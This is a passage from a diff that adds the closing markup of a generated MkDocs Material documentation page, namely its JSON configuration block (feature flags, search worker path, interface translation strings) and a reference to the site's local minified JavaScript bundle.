+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["content.code.copy", "content.action.edit", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.92b07e13.min.js"></script>
+      
+    
+  </body>
+</html>
